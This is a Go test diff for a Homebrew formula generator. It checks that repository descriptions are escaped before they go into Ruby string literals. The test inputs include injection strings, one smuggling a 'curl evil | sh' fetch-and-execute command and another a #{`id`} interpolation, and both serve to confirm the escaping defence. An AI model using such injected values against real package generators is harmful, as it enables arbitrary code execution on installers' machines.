@@ -53,6 +53,74 @@ func TestGenerate_DefaultFormulaClassName(t *testing.T) {
 	assert.Contains(t, buf.String(), "class MyTool < Formula")
 }
 
+func TestRubyStringEscape(t *testing.T) {
+	tests := []struct {
+		name, in, want string
+	}{
+		{"plain", "hello world", "hello world"},
+		{"double quote", `say "hi"`, `say \"hi\"`},
+		{"backslash", `path\to\thing`, `path\\to\\thing`},
+		{"backslash before quote", `a\"b`, `a\\\"b`}, // \\ first, then \"
+		{"hash interpolation", `value=#{1+1}`, `value=\#{1+1}`},
+		{"bare hash is ok but still escaped defensively", "issue #42", `issue \#42`},
+		{"newline passes through", "line1\nline2", "line1\nline2"},
+		{"empty", "", ""},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			assert.Equal(t, tt.want, rubyStringEscape(tt.in))
+		})
+	}
+}
+
+// TestGenerate_EscapesRubyInjectionInDescription confirms that a crafted
+// repo description cannot break out of the desc "..." literal and inject
+// Ruby. Without rubyStringEscape, a description like:  foo" ; system "evil
+// would render as: desc "foo" ; system "evil"  — executing attacker code
+// at `brew install` time.
+func TestGenerate_EscapesRubyInjectionInDescription(t *testing.T) {
+	r := &Recipe{
+		Owner:       "o",
+		Repo:        "tool",
+		Version:     "v1.0.0",
+		Description: `foo" ; system "curl evil | sh`,
+		ClassName:   "Tool",
+		Files:       fakeFilesNoMatch(),
+	}
+
+	var buf bytes.Buffer
+	require.NoError(t, r.Generate(&buf))
+	out := buf.String()
+
+	// The rendered line must contain the escaped form, not the raw form
+	// that would terminate the Ruby string early.
+	assert.Contains(t, out, `desc "foo\" ; system \"curl evil | sh"`,
+		"description must be escaped inside the Ruby double-quoted literal; got:\n%s", out)
+	assert.NotContains(t, out, `desc "foo" ; system "curl`,
+		"unescaped form must not appear — Ruby would parse the injection as real code")
+}
+
+// TestGenerate_EscapesRubyInterpolationInDescription confirms the #{...}
+// neutralization: Ruby expands #{expr} inside "..." literals. A description
+// with #{`id`} would execute the `id` command at formula-load time without
+// the # -> \# escape.
+func TestGenerate_EscapesRubyInterpolationInDescription(t *testing.T) {
+	r := &Recipe{
+		Owner:       "o",
+		Repo:        "tool",
+		Version:     "v1",
+		Description: "oops #{`id`}",
+		ClassName:   "Tool",
+		Files:       fakeFilesNoMatch(),
+	}
+	var buf bytes.Buffer
+	require.NoError(t, r.Generate(&buf))
+	out := buf.String()
+
+	assert.Contains(t, out, `desc "oops \#{`+"`"+`id`+"`"+`}"`,
+		"# must be backslash-escaped so #{...} is not recognized as interpolation; got:\n%s", out)
+}
+
 // fakeFilesNoMatch returns a Files slice that is non-empty (so Generate
 // skips the auto-fetch branch) but contains no names matching the
 // darwin/linux × amd64/arm64 filter — so template rendering never calls
